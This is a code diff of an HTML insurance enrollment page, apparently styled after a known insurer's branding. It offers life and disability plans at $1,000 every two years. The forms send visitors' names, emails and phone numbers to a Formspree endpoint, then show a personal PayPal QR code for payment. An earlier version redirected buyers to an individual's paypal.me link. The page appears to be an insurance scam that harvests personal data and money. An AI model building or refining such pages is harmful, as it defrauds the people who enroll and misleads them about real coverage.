@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Guardian Style | Enrollment</title>
+    <title>Enrollment | Biennial Insurance Plans</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -11,7 +11,7 @@
     <header class="hero">
         <div class="hero-content">
             <h1>Well-being, inspired.</h1>
-            <p>Insurance plans and policies that help you thrive. Enroll today in just a few steps.</p>
+            <p>Secure your future with our biennial insurance coverage. Simple enrollment, direct processing.</p>
             
             <div class="selector-container">
                 <p>I am...</p>
@@ -26,9 +26,10 @@
 
     <main class="main-content">
         <span class="section-tag">Direct Enrollment</span>
-        <h2 class="section-title">Biennial Insurance Plans</h2>
+        <h2 class="section-title">Insurance Plans</h2>
 
         <div class="card-grid">
+            
             <div class="card">
                 <div class="card-image-container">
                     <div class="savings-badge">Save $200</div>
@@ -42,27 +43,54 @@
                     </div>
 
                     <form class="enrollment-form" action="https://formspree.io/f/xnjlbbvq" method="POST">
-                        <input type="hidden" name="Plan" value="Life Insurance">
+                        <input type="hidden" name="Plan_Type" value="Life Insurance">
                         <div class="form-row">
                             <input type="text" name="firstName" placeholder="First Name" required>
                             <input type="text" name="lastName" placeholder="Last Name" required>
                         </div>
                         <input type="email" name="email" placeholder="Email Address" required>
                         <input type="tel" name="phone" placeholder="Mobile Number" required>
-                        <button type="submit" class="paypal-btn">Submit & Pay $1,000</button>
+                        <button type="submit" class="payment-btn">Submit & Get QR Code</button>
                     </form>
                 </div>
             </div>
+
+            <div class="card">
+                <div class="card-image-container">
+                    <div class="savings-badge">Fixed Rate</div>
+                    <img src="https://images.unsplash.com/photo-1517836357463-d25dfeac3438?auto=format&fit=crop&w=500&q=60" alt="Disability" class="card-img">
+                </div>
+                <div class="card-body">
+                    <h3>Disability Insurance</h3>
+                    <div class="price-tag">
+                        <span class="amount">$1,000</span>
+                        <span class="frequency">every 2 years</span>
+                    </div>
+
+                    <form class="enrollment-form" action="https://formspree.io/f/xnjlbbvq" method="POST">
+                        <input type="hidden" name="Plan_Type" value="Disability Insurance">
+                        <div class="form-row">
+                            <input type="text" name="firstName" placeholder="First Name" required>
+                            <input type="text" name="lastName" placeholder="Last Name" required>
+                        </div>
+                        <input type="email" name="email" placeholder="Email Address" required>
+                        <input type="tel" name="phone" placeholder="Mobile Number" required>
+                        <button type="submit" class="payment-btn">Submit & Get QR Code</button>
+                    </form>
+                </div>
+            </div>
+
         </div>
     </main>
 
     <div id="qr-modal" class="modal-overlay">
         <div class="modal-content">
             <span class="close-modal">&times;</span>
-            <h3>Scan to Pay $1,000</h3>
-            <p>Scan with your PayPal app to complete enrollment.</p>
+            <h3>Final Step: Payment</h3>
+            <p>Scan your PayPal QR code below to complete the $1,000 payment.</p>
             <img src="pp_p2p_my_qrcode_1776494852738_2.jpg" alt="PayPal QR Code" class="qr-display">
-            <button onclick="location.reload()" class="done-btn">I have paid</button>
+            <p style="font-size: 0.8rem; color: #666;">Once paid, we will process your enrollment within 24 hours.</p>
+            <button onclick="location.reload()" class="done-btn">Finished Payment</button>
         </div>
     </div>
 
@@ -70,7 +98,7 @@
         document.querySelectorAll('.enrollment-form').forEach(form => {
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
-                const btn = this.querySelector('.paypal-btn');
+                const btn = this.querySelector('.payment-btn');
                 const modal = document.getElementById('qr-modal');
                 
                 btn.textContent = "Processing...";
@@ -84,35 +112,21 @@
                 });
 
                 if (response.ok) {
-                    // SHOW THE QR CODE
                     modal.style.display = "flex";
-                    btn.textContent = "Submit & Pay $1,000";
+                    btn.textContent = "Submit & Get QR Code";
                     btn.style.opacity = "1";
-                    this.reset(); // Clear the form
+                    this.reset();
                 } else {
                     alert("Submission failed. Please try again.");
-                    btn.textContent = "Submit & Pay $1,000";
+                    btn.textContent = "Submit & Get QR Code";
                     btn.style.opacity = "1";
                 }
             });
         });
 
-        // Close logic
         document.querySelector('.close-modal').onclick = () => {
             document.getElementById('qr-modal').style.display = "none";
         };
-    </script>
-</body>
-</html>                if (response.ok) {
-                    // This sends them to PayPal ONLY after the form data is captured
-                    window.location.href = "https://www.paypal.com/paypalme/adriancoyoca47/1000";
-                } else {
-                    alert("Submission failed. Please check your connection.");
-                    btn.textContent = originalText;
-                    btn.style.opacity = "1";
-                }
-            });
-        });
     </script>
 </body>
 </html>
